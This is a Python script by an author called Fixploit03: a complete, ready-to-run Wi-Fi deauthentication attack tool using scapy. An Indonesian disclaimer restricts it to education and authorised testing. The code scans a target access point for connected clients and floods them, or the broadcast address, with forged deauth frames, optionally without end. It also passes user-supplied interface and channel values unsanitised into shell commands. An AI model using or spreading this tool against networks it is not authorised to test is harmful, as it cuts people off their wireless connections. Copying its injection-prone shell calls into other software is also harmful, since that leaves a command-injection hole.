#!/usr/bin/python3
#
#--------------------------------------------------------------------------------------------------------------------------
# Pembuat: Rofi (Fixploit03)
# Github: https://github.com/fixploit03/deauther
# Copyright (c) 2025 - Rofi (Fixploit03)
#--------------------------------------------------------------------------------------------------------------------------
# DISCLAIMER:
#
# Program ini dibuat semata-mata untuk tujuan edukasi dan pembelajaran tentang keamanan jaringan nirkabel (Wi-Fi).
# Penggunaan program ini harus dilakukan hanya pada jaringan atau perangkat yang Anda miliki atau memiliki izin eksplisit
# dari pemiliknya untuk menguji keamanannya. Penggunaan program ini untuk tujuan ilegal, seperti mengganggu,
# menyusup, atau merusak jaringan tanpa izin, adalah melanggar hukum di banyak yurisdiksi dan dapat mengakibatkan
# konsekuensi hukum yang serius, termasuk denda atau penjara.
#
# Pembuat (Rofi/Fixploit03) tidak bertanggung jawab atas segala bentuk penyalahgunaan atau kerusakan
# yang disebabkan oleh penggunaan program ini. Anda, sebagai pengguna, bertanggung jawab penuh atas tindakan Anda
# sendiri dan harus mematuhi hukum serta peraturan yang berlaku di wilayah Anda.
#
# Program ini dirancang untuk membantu memahami cara kerja serangan deauthentication dalam lingkungan yang terkendali
# dan legal, seperti laboratorium keamanan siber atau pengujian penetrasi yang diizinkan. Kami sangat menyarankan
# agar Anda mempelajari etika hacking dan hukum terkait sebelum menggunakan program ini. Jangan gunakan program ini untuk
# tujuan jahat atau tanpa persetujuan yang sah dari pihak yang berwenang.
#
# Dengan menggunakan program ini, Anda menyatakan bahwa Anda memahami risiko, tanggung jawab, dan batasan hukumnya,
# serta setuju untuk menggunakannya hanya dalam konteks yang sah dan etis untuk kepentingan pendidikan atau
# pengujian keamanan yang diizinkan.
#--------------------------------------------------------------------------------------------------------------------------

import sys
import time
import re
import os
import signal
import argparse
from scapy.all import *
from termcolor import colored

# Global flag to stop the attack
stop_attack = False

def signal_handler(sig, frame):
    """Handle CTRL+C gracefully"""
    global stop_attack
    time_str = colored(get_current_time(), 'cyan')
    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("CTRL+C detected. Stopping deauthentication attack...", 'white'))
    stop_attack = True
    sys.exit(0)

def get_current_time():
    """Return the current time in HH:MM:SS format"""
    return time.strftime("%H:%M:%S")

def validate_mac(mac):
    """Validate MAC address format"""
    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
        raise ValueError(f"Invalid MAC address format: {mac}")
    return mac

def check_root():
    """Check if the program is run as root"""
    if os.geteuid() != 0:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Run as root!", 'white'))
        sys.exit(1)

def check_interface_exists(interface):
    """Check if the network interface exists in the system"""
    interfaces = os.listdir("/sys/class/net/")
    if interface not in interfaces:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Interface {interface} not found!", 'white'))
        sys.exit(1)

def check_interface_mode(interface):
    """Check if the interface is in monitor mode"""
    try:
        result = os.popen(f"iwconfig {interface}").read()
        if "Mode:Monitor" not in result:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Interface is not in monitor mode!", 'white'))
            sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error checking interface mode: {e}", 'white'))
        sys.exit(1)

def create_deauth_packet(bssid, client):
    """Create a deauthentication packet"""
    pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    return pkt

def scan_clients(interface, bssid, channel, timeout=30):
    """Scan for all clients connected to the AP, ensuring no duplicates"""
    clients = set()
    try:
        os.system(f"sudo iwconfig {interface} channel {channel}")
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error setting channel: {e}", 'white'))
        sys.exit(1)
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11) and pkt.addr2 == bssid and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
            client_mac = pkt.addr1
            if client_mac not in clients:
                clients.add(client_mac)
                time_str = colored(get_current_time(), 'cyan')
                print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found client: {client_mac}", 'white'))
    
    time_str = colored(get_current_time(), 'cyan')
    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Scanning clients for {timeout} seconds...", 'white'))
    sniff(iface=interface, prn=packet_handler, timeout=timeout)
    return list(clients)

def send_deauth_packets(interface, bssid, clients, count, channel, interval=0):
    """Send deauthentication packets to detected clients or broadcast if no clients are found"""
    try:
        if not clients:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("No clients found, falling back to broadcast mode.", 'white'))
            clients = ["ff:ff:ff:ff:ff:ff"]
        else:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found {len(clients)} clients: {clients}", 'white'))

        bssid = validate_mac(bssid)
        os.system(f"sudo iwconfig {interface} channel {channel}")

        if count == 0:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack (continuous mode, interval: {interval}s)...", 'white'))
            packet_number = 1
            while not stop_attack:
                for client_mac in clients:
                    packet = create_deauth_packet(bssid, client_mac)
                    sendp(packet, iface=interface, verbose=0)
                    time_str = colored(get_current_time(), 'cyan')
                    if client_mac != "ff:ff:ff:ff:ff:ff":
                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (CLIENT: {client_mac})", 'white'))
                    else:
                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (broadcast mode)", 'white'))
                    packet_number += 1
                    time.sleep(interval)
        else:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with {count} packets (interval: {interval}s)...", 'white'))
            packet_number = 1
            while packet_number <= count and not stop_attack:
                for client_mac in clients:
                    if packet_number > count:
                        break
                    packet = create_deauth_packet(bssid, client_mac)
                    sendp(packet, iface=interface, verbose=0)
                    time_str = colored(get_current_time(), 'cyan')
                    if client_mac != "ff:ff:ff:ff:ff:ff":
                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{count} to {bssid} (CLIENT: {client_mac})", 'white'))
                    else:
                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{count} to {bssid} (broadcast mode)", 'white'))
                    packet_number += 1
                    time.sleep(interval)

        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("Deauthentication attack completed.", 'white'))
    except PermissionError:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Permission denied: Please ensure you have the necessary privileges.", 'white'))
        sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error during deauthentication attack: {e}", 'white'))
        sys.exit(1)

def main():
    """Main function to coordinate program execution"""
    signal.signal(signal.SIGINT, signal_handler)
    check_root()

    description = (
        "WiFi Deauthentication Attack Program\n"
        "Author: Rofi (Fixploit03)\n"
        "GitHub: https://github.com/fixploit03/deauther\n"
        "Copyright (c) 2025 Rofi (Fixploit03). All rights reserved."
    )
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-i", "--interface", required=True, help="Network interface in monitor mode (e.g., wlan0)")
    parser.add_argument("-b", "--bssid", required=True, help="BSSID of the target AP (e.g., 00:11:22:33:44:55)")
    parser.add_argument("-c", "--channel", type=int, required=True, help="Channel of the target AP (e.g., 6)")
    parser.add_argument("-a", "--client", help="Client MAC to deauth (e.g., 66:77:88:99:AA:BB). If not specified, scans for clients")
    parser.add_argument("-n", "--count", type=int, default=0, help="Number of packets to send. Use 0 for continuous mode (default: 0)")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Client scan timeout in seconds (default: 30)")
    parser.add_argument("-s", "--interval", type=float, default=0, help="Interval between packet sends in seconds (e.g., 0.1, default: 0)")

    args = parser.parse_args()

    check_interface_exists(args.interface)
    check_interface_mode(args.interface)

    try:
        if args.client is None:
            clients = scan_clients(args.interface, args.bssid, args.channel, args.timeout)
        else:
            clients = [validate_mac(args.client)]

        send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval)

    except ValueError as ve:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error: {ve}", 'white'))
        sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Critical error: {e}", 'white'))
        sys.exit(1)

if __name__ == "__main__":
    main()
